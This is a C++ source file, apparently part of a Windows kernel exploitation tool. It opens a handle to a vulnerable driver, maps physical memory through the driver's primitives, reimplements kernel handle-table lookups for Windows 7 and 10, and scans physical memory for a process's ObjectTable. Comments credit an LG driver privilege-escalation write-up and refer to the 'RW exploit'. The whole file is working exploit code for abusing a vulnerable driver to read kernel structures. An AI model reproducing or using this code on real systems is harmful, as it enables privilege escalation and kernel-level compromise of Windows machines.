#include "DriverHelper.h"


// Check windows
#if _WIN32 || _WIN64
#if _WIN64
#define ENV64BIT
#else
#define ENV32BIT
#endif
#endif


HANDLE DriverHelper::hDeviceDrv = NULL;
_fn_memcpy DriverHelper::fn_memcpy = 0;
_fn_mapPhysical DriverHelper::fn_mapPhysical = 0;
_fn_unmapPhysical DriverHelper::fn_unmapPhysical = 0;



// Thanks to Jackson (http://jackson-t.ca/lg-driver-lpe.html)
int DriverHelper::memmem(PBYTE haystack, DWORD haystack_size, PBYTE needle, DWORD needle_size)
{
	int haystack_offset = 0;
	int needle_offset = 0;

	haystack_size -= needle_size;

	for (haystack_offset = 0; haystack_offset <= haystack_size; haystack_offset++) {
		for (needle_offset = 0; needle_offset < needle_size; needle_offset++)
			if (haystack[haystack_offset + needle_offset] != needle[needle_offset])
				break; // Next character in haystack.

		if (needle_offset == needle_size)
			return haystack_offset;
	}

	return -1;
}



int DriverHelper::getDeviceHandle(LPTSTR name)
{
	DriverHelper::hDeviceDrv = CreateFile(name, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (DriverHelper::hDeviceDrv == INVALID_HANDLE_VALUE)
	{
		std::cout << "[-] Handle failed: " << std::dec << GetLastError() << std::endl;
		return 1;
	}
	std::cout << "[+] HANDLE obtained" << std::endl;
	return 0;
}


unsigned __int64 __fastcall DriverHelper::ExpLookupHandleTableEntryW7(__int64 HandleTable, unsigned __int64 handle)
{
	__int64 v2; // r8@2
	signed __int64 v3; // rcx@2
	__int64 v4; // r8@2
	unsigned __int64 result; // rax@3
	unsigned __int64 v6; // [sp+8h] [bp+8h]@1

	v6 = handle;
	v6 = handle & 0xFFFFFFFC;
	if (v6 >= *((DWORD *)(HandleTable + 23)))
	{
		result = 0i64;
	}
	else
	{
		v2 = *(__int64 *)HandleTable;
		v3 = *(__int64 *)HandleTable & 3i64;
		v4 = v2 - (unsigned int)v3;
		if ((DWORD)v3)
		{
			//JUMPOUT(v3, 1, sub_1403A0DE0);
			ULONGLONG tmp;
			DriverHelper::fn_memcpy((ULONGLONG)&tmp, v4 + ((handle - (handle & 0x3FF)) >> 7), sizeof(ULONGLONG));
			result = (tmp)+4 * (handle & 0x3FF);
		}
		else
		{
			result = v4 + 4 * handle;
		}
	}
	return result;
}

unsigned __int64 __fastcall DriverHelper::ExpLookupHandleTableEntryW10(__int64 HandleTable, __int64 handle)
{
	unsigned __int64 v2; // rdx@1
	__int64 v3; // r8@2
	signed __int64 v4; // rax@2
	ULONGLONG v5; // rax@3
	unsigned __int64 result; // rax@4

	v2 = handle & 0xFFFFFFFFFFFFFFFCui64;
	if (v2 >= *(DWORD *)HandleTable)
	{
		result = 0i64;
	}
	else
	{
		v3 = *(__int64 *)(HandleTable + 8);
		v4 = *(__int64 *)(HandleTable + 8) & 3i64;
		if ((DWORD)v4 == 1)
		{
			DriverHelper::fn_memcpy((ULONGLONG)&v5, (v3 + 8 * (v2 >> 10) - 1), sizeof(ULONGLONG));
			return v5 + 4 * (v2 & 0x3FF);
		}
		if ((DWORD)v4)
		{
			ULONGLONG tmp = DriverHelper::fn_mapPhysical((v3 + 8 * (v2 >> 19) - 2), sizeof(ULONGLONG));
			v5 = DriverHelper::fn_mapPhysical(tmp + 8 * ((v2 >> 10) & 0x1FF), sizeof(ULONGLONG));
			return v5 + 4 * (v2 & 0x3FF);
		}
		result = v3 + 4 * v2;
	}
	return result;
}



DWORDLONG DriverHelper::findPhisical(DWORDLONG startAddress,
	DWORDLONG stopAddress,
	DWORD searchSpace,
	PBYTE  searchBuffer,
	DWORD bufferSize)
{
	DWORDLONG matchAddress = 0;

	// Check if space search is bigger than maximum.
	if ((startAddress + searchSpace) > stopAddress)
		return matchAddress;

	// Map Physical into buffer
	ULONG64 buffer = DriverHelper::fn_mapPhysical(startAddress, searchSpace);

	int offset = DriverHelper::memmem((PBYTE)buffer, searchSpace, searchBuffer, bufferSize);

	//free
	DriverHelper::fn_unmapPhysical(buffer);

	if (offset >= 0)
		matchAddress = startAddress + offset;

	return matchAddress;

}


ULONG64 DriverHelper::findPhisical_ObjectTable(DWORDLONG startAddress,
	DWORDLONG stopAddress,
	DWORD searchSpace,
	PBYTE  searchBuffer,
	DWORD bufferSize)
{
	DWORDLONG matchAddress = NULL;
	DWORDLONG pObjectTableOffset = 0;

	DWORDLONG searchAddress = startAddress;



	while (TRUE)
	{
		if ((startAddress + searchSpace) >= stopAddress)
		{
			//free(ppivotProcess);
			return matchAddress;
		}

		if (searchAddress % 0x100000 == 0)
		{
			printf("Searching from address: 0x%016I64X.\r", searchAddress);
			fflush(stdout);
		}

		// Let's get 
		Sleep(0.5);
		matchAddress = findPhisical(searchAddress, _UI64_MAX, searchSpace, searchBuffer, bufferSize);

		if (searchAddress % 0x10000000 == 0)
		{
			Sleep(1000);
			fflush(stdout);
		}

		if (searchAddress == 0xffffffff)
		{
			exit(0);
		}

		if (matchAddress > searchAddress)
		{
			// Calculating the offset of ObjectTable inside the section
			// This is done due to compatibility, MmMapIoSpace allows to map not multiples of 0x1000, but MapSection doesn't, we can change the RW exploit and this will still work
			pObjectTableOffset = matchAddress - searchAddress - (OFFSET_IMAGEFILENAME - OFFSET_OBJECTTABLE);

			PBYTE pObjectTableAddr = (PBYTE)malloc(sizeof(DWORDLONG));

			ULONG64 buf = DriverHelper::fn_mapPhysical(searchAddress, searchSpace);
			memcpy(pObjectTableAddr, ((void*)(buf + pObjectTableOffset)), sizeof(DWORDLONG));
			DriverHelper::fn_unmapPhysical(buf);
			// here ^
			//((void**)pObjectTableAddr) deref pointer to pointer

			ULONG64 result = (ULONG64)(pObjectTableAddr);
			return result;
		}

		searchAddress += searchSpace;

	}
}